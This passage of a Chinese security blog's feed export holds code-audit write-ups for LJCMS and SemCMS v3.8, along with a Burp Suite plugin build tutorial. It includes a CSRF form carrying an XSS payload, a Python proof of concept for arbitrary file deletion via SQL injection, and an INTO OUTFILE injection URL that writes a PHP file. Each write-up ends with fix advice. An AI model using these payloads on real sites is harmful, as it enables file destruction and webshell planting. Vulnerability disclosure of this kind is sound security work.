class="string">"sitename"</span> value=<span class="string">"�&amp;#137;&amp;#175;�&amp;#178;&amp;#190;PHP�&amp;#188;&amp;#129;�&amp;#184;&amp;#154;�&amp;#189;&amp;#145;�&amp;#171;&amp;#153;�&amp;#174;&amp;#161;�&amp;#144;&amp;#134;�&amp;#179;&amp;#187;�&amp;#187;&amp;#159;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteurl"</span> value=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;localhost&amp;#47;ljcms&amp;#47;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"icpcode"</span> value=<span class="string">"浜&amp;#172;ICP�&amp;#164;&amp;#135;08002262�&amp;#143;&amp;#183;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"sitephone"</span> value=<span class="string">"010&amp;#45;81991660"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteqq"</span> value=<span class="string">"1665976568"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteemail"</span> value=<span class="string">"82993936&amp;#64;qq&amp;#46;com"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteaddress"</span> value=<span class="string">"�&amp;#140;&amp;#151;浜&amp;#172;�&amp;#184;&amp;#130;�&amp;#184;&amp;#176;�&amp;#143;&amp;#176;�&amp;#140;虹&amp;#167;&amp;#145;�&amp;#138;&amp;#128;�&amp;#155;&amp;#173;�&amp;#175;哄&amp;#190;&amp;#183;�&amp;#184;&amp;#173;�&amp;#191;&amp;#131;4�&amp;#143;&amp;#183;�&amp;#165;&amp;#188;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"longitude"</span> value=<span class="string">"116&amp;#46;304724"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"latitude"</span> value=<span class="string">"39&amp;#46;835519"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"tjcode"</span> value=<span class="string">"boogle&lt;/textarea&gt;&lt;script&gt;alert('boogle')&lt;/script&gt;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"qrcode"</span> value=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;pic49&amp;#46;nipic&amp;#46;com&amp;#47;file&amp;#47;20140926&amp;#47;9422602&amp;#95;102539153000&amp;#95;2&amp;#46;jpg"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"logo"</span> value=<span class="string">"data&amp;#47;attachment&amp;#47;201811&amp;#47;01&amp;#47;0b4affc887ed2b08&amp;#46;png"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"logowidth"</span> value=<span class="string">"232"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"logoheight"</span> value=<span class="string">"60"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"btn&amp;#95;save"</span> value=<span class="string">"�&amp;#155;&amp;#180;�&amp;#150;&amp;#176;�&amp;#191;&amp;#157;�&amp;#173;&amp;#152;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Submit request"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0x04-修复方式"><a href="#0x04-修复方式" class="headerlink" title="0x04 修复方式"></a>0x04 修复方式</h2><p>增加防御csrf的验证<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">token</span>、referer、验证码</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此次审计为Ljphpcms_v1.03最新版&lt;br&gt;demo:&lt;a href=&quot;http://dem
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite安装分块传输插件</title>
    <link href="https://zhengbao.wang/burpsuite%E5%AE%89%E8%A3%85%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%8F%92%E4%BB%B6/"/>
    <id>https://zhengbao.wang/burpsuite安装分块传输插件/</id>
    <published>2019-03-18T02:14:07.000Z</published>
    <updated>2019-03-18T02:22:10.065Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x02-mvn-package"><a href="#0x02-mvn-package" class="headerlink" title="0x02 mvn package"></a>0x02 mvn package</h2><h3 id="命令打包"><a href="#命令打包" class="headerlink" title="命令打包"></a>命令打包</h3><p>下载完成后可直接在<code>pom.xml</code>根目录执行<code>mvn package</code>进行打包，成功后生成一个<code>target</code>文件夹，里面有打包好的burpsuite插件。</p><h3 id="IDE打包"><a href="#IDE打包" class="headerlink" title="IDE打包"></a>IDE打包</h3><p>我这里就用的<code>myeclipse</code>。这里简述一下步骤<br>首先通过<code>file-&gt;import</code>导入目标，选择<code>Existing Maven Projects</code><br><img src="https://i.loli.net/2019/03/18/5c8ef5589fe5a.png" alt><br>执行下一步，选择下载好的包含<code>pom.xml</code>的上级目录即可<br><img src="https://i.loli.net/2019/03/18/5c8ef614e87b5.png" alt><br>然后稍等一会即可在<code>Packahe Explorer</code>视图中看到整个项目<br><img src="https://i.loli.net/2019/03/18/5c8ef65fbfb83.png" alt><br>然后在<code>pom.xml</code>上右键执行<code>run as-&gt;maven package</code>操作。<br>如果没有<code>maven package</code>操作可以选择<code>maven build</code>，新建一个，填写Goals为package<br><img src="https://i.loli.net/2019/03/18/5c8ef75b39b21.png" alt><br>然后等待其打包完成即可，完成后在target目录中机会生成目标<code>.jar</code>文件<br><img src="https://i.loli.net/2019/03/18/5c8ef83018b3c.png" alt></p><p>然后启动burpsuite，执行插件添加操作，选择刚才打包好的jar文件<br><img src="https://i.loli.net/2019/03/18/5c8ef868ba29d.png" alt></p><p>安装成功会有提示<br><img src="https://i.loli.net/2019/03/18/5c8ef8c54ec3f.png" alt><br>然后就可以享受这一利器带来的便利了<br><img src="https://i.loli.net/2019/03/18/5c8ef9079e7cc.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：&lt;a href=&quot;https:
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="burpsuite" scheme="https://zhengbao.wang/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8任意文件刪除</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%AA%E9%99%A4/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8任意文件刪除/</id>
    <published>2019-03-16T08:24:25.000Z</published>
    <updated>2019-03-25T00:35:07.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第五篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网: <a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-任意文件删除"><a href="#0x01-任意文件删除" class="headerlink" title="0x01 任意文件删除"></a>0x01 任意文件删除</h2><p>首先在后台<code>Include/function.php</code>功能函数文件中，有一个执行文件删除的函数<code>Delfile()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//删除指定文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delfile</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">   $filename=str_replace(<span class="string">"prdoucts/"</span>, <span class="string">"prdoucts/small/"</span>, $filename);</span><br><span class="line">  <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>全局搜索查看在哪里调用了该函数。发现在<code>SEMCMS_Function.php</code>中有多次调用<br><img src="https://i.loli.net/2019/03/16/5c8cbc75c111b.png" alt><br>这里随便跟踪一个，进入到<code>SEMCMS_Function.php</code>第921行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="variable">$db_conn</span>-&gt;query(<span class="string">"select * from sc_images WHERE ID in (<span class="variable">$area_arr</span>)"</span>);</span><br><span class="line">                    <span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$query</span>))&#123;</span><br><span class="line">                         Delfile(<span class="variable">$row</span>[<span class="string">'images_url'</span>]);</span><br><span class="line">                       &#125;</span><br></pre></td></tr></table></figure></p><p>可以发现应该是一个图片删除操作，图片目录保存在数据表<code>sc_images</code>中。到数据库中查看可以验证这一点<br><img src="https://i.loli.net/2019/03/16/5c8cbd2c1d826.png" alt></p><p>那么此时便可以看看<code>$area_arr</code>变量是否可控，从而改变sql查询的结果，达到任意文件删除。继续向上跟踪<code>area_arr</code>变量。<br><img src="https://i.loli.net/2019/03/16/5c8cbdf0f1584.png" alt><br>在该文件开头可以看到定义了<code>area_arr</code>数组，并且是由<code>POST</code>方式传递进来的<code>AID</code>得到的。<br>这里小伙伴们又要开始惊喜了，因为前面的分析分章不只出现这一处问题了,我们知道后台所有页面均包含了<code>contorl.php</code>对<code>GET</code>传来的数据进行了清洗。而这里偏偏却用了POST方式来接收数据，继续跟踪改变量后，发现到拼接进sql语句再到进入文件删除函数过程中未进行其他任何过滤。</p><p><code>SEMCMS_Function.php 919行</code><br><img src="https://i.loli.net/2019/03/16/5c8cb6d02d441.png" alt><br>后台<code>Include/function.php</code><br><img src="https://i.loli.net/2019/03/16/5c8cb72c99346.png" alt></p><p>如上图显示，网站根目录下<code>boogle.php</code>已被成功删除。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="comment">#[+]Author : boogle</span></span><br><span class="line"><span class="comment">#[+]Blog :https://boogle.github.io/</span></span><br><span class="line"></span><br><span class="line">delete_file = <span class="string">"'../test.php'"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"-1) union select 1,"</span>+delete_file+<span class="string">",3,4,5-- -"</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php?Class=Deleted&amp;CF=Images"</span></span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Origin"</span>: <span class="string">"http://127.0.0.1"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>, <span class="string">"Referer"</span>: <span class="string">"http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">burp0_data=&#123;<span class="string">"AID[]"</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers,  data=burp0_data)</span><br><span class="line"></span><br><span class="line">print <span class="string">"[+]delete Success!"</span></span><br></pre></td></tr></table></figure><h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><p>在<code>contorl.php</code>中增加对POST的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST))&#123;$PostArray=$_POST;&#125;<span class="keyword">else</span>&#123;$PostArray=<span class="string">''</span>;&#125; <span class="comment">//post</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($PostArray <span class="keyword">as</span> $value)&#123; <span class="comment">//post</span></span><br><span class="line">    </span><br><span class="line">    verify_str($value);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第五篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8 后台注入getshell</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5getshell/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8-后台注入getshell/</id>
    <published>2019-03-16T03:20:02.000Z</published>
    <updated>2019-03-25T00:35:12.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第四篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-后台sql注入绕过过滤函数写文件"><a href="#0x01-后台sql注入绕过过滤函数写文件" class="headerlink" title="0x01 后台sql注入绕过过滤函数写文件"></a>0x01 后台sql注入绕过过滤函数写文件</h2><p>前面三篇审计文章中，注入过程中均受到了<code>inject_check_sql()</code>过滤函数的影响，导致<code>select`</code>outfile`等无法使用。而且通过前面的审计，我们已有两种方法进入后台，此次继续向后台进发。<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function inject_check_sql($sql_str) &#123;</span><br><span class="line">     return preg_match('/select|<span class="string">insert</span>|<span class="string">=</span>|<span class="string">%</span>|<span class="string">&lt;</span>|<span class="string">between</span>|<span class="string">update</span>|<span class="string">\'</span>|<span class="string">\*</span>|<span class="string">union</span>|<span class="string">into</span>|<span class="string">load_file</span>|<span class="string">outfile/i',$sql_str);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p><p>本次后台的注入点将绕过该过滤函数，执行更多的操作，运气好的话，更会直接getshell。<br>下面开始审计过程<br>漏洞触发点在后台<code>SEMCMS_Products.php</code><br>在18行<br><img src="https://i.loli.net/2019/03/16/5c8c67651ca1b.png" alt><br>这里接受searchml竟然使用了<code>REQUEST</code>方式，因为前面都包含了<code>control.php</code>，在该函数中均GET得到的数据进行了清洗<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防sql入注</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET))&#123;$GetArray=$_GET;&#125;<span class="keyword">else</span>&#123;$GetArray=<span class="string">''</span>;&#125; <span class="comment">//get</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($GetArray <span class="keyword">as</span> $value)&#123; <span class="comment">//get</span></span><br><span class="line">    </span><br><span class="line">    verify_str($value);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而此次使用了<code>REQUEST</code>来获取数据，如入无人之地，继续跟踪该变量<code>CatID</code>的走向<br>还是在该文件的132，可以看到<code>CatID</code>变量进入了<code>prolmid</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($CatID!=<span class="string">""</span> &amp;&amp; $Searchp!=<span class="string">""</span>)&#123;</span><br><span class="line"></span><br><span class="line">     $flID=prolmid($CatID,$db_conn);</span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and products_name like '%"</span>.$Searchp.<span class="string">"%' and $flID"</span>); </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">elseif</span>($CatID!=<span class="string">""</span> &amp;&amp; $Searchp==<span class="string">""</span>)&#123;</span><br><span class="line"></span><br><span class="line">     $flID=prolmid($CatID,$db_conn);</span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and $flID"</span>);     </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">elseif</span>($CatID==<span class="string">""</span> &amp;&amp; $Searchp!=<span class="string">""</span>)&#123;</span><br><span class="line">     </span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and products_name like '%"</span>.$Searchp.<span class="string">"%'"</span>);     </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">elseif</span>($indextjs==<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">     $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">" and products_index=1 "</span>);   </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    $sql=$db_conn-&gt;query(<span class="string">"select * from sc_products where languageID="</span>.$_GET[<span class="string">"lgid"</span>].<span class="string">""</span>);  </span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>跟进<code>prolmid</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prolmid</span><span class="params">($ID,$db_conn)</span></span>&#123;  </span><br><span class="line"></span><br><span class="line">    $str=<span class="string">""</span>;</span><br><span class="line">    $strs=<span class="string">""</span>; </span><br><span class="line">    $query=$db_conn-&gt;query(<span class="string">"select ID from sc_categories where LOCATE(',"</span>.$ID.<span class="string">",', category_path)&gt;0 and category_open=1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>($row=mysqli_fetch_array($query))&#123;</span><br><span class="line">        </span><br><span class="line">      $str.= <span class="string">"LOCATE(',"</span>.$row[<span class="string">'ID'</span>].<span class="string">",', products_category)&gt;0 or "</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">      $strs =<span class="string">"("</span>.rtrim($str,<span class="string">"or "</span>).<span class="string">")"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> $strs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到未经任何过滤直接拼接带入了sql语句。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>直接构造一个写webshell的payload<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Products.php?searchml=1<span class="number">%27</span>,<span class="number">%20</span>category_path)<span class="number">%3</span>E0<span class="number">%20</span>and<span class="number">%20</span>category_open=1<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span><span class="number">%22</span><span class="number">%3</span>C?php<span class="number">%20</span>phpinfo();?<span class="number">%3</span>E<span class="number">%22</span><span class="number">%20</span>into<span class="number">%20</span>outfile<span class="number">%20</span><span class="number">%22</span>F:\\phpstudy\\PHPTutorial\\WWW\\semcms_php_v3.8\\boogle.php<span class="number">%22</span>--<span class="number">%20</span>-</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/16/5c8c6a84d3557.png" alt></p><p>访问<code>http://127.0.0.1/semcms_php_v3.8/boogle.php</code>,看到写入成功</p><p><img src="https://i.loli.net/2019/03/16/5c8c6ac6bcac3.png" alt></p><h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><p>将<code>REQUEST</code>改为<code>GET</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第四篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8 时间盲注</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8-时间盲注/</id>
    <published>2019-03-15T13:23:02.000Z</published>
    <updated>2019-03-25T00:35:03.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第三篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-web-check-php时间盲注得后台账号密码"><a href="#0x01-web-check-php时间盲注得后台账号密码" class="headerlink" title="0x01 web_check.php时间盲注得后台账号密码"></a>0x01 web_check.php时间盲注得后台账号密码</h2><p>首先查看后台登陆页面,忘记密码处<br><img src="https://i.loli.net/2019/03/15/5c8b1da3d28e6.png" alt><br>后台<code>index.html</code>代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">"text-align:right; margin-right:10px; float:right;"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:views();"</span>&gt;</span>如果忘记账号与密码,试试找回?<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">style</span>=<span class="string">"width:70px; height:28px; border:0px;"</span> <span class="attr">src</span>=<span class="string">"SC_Page_Config/Image/SEMCMS_Longin.jpg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span 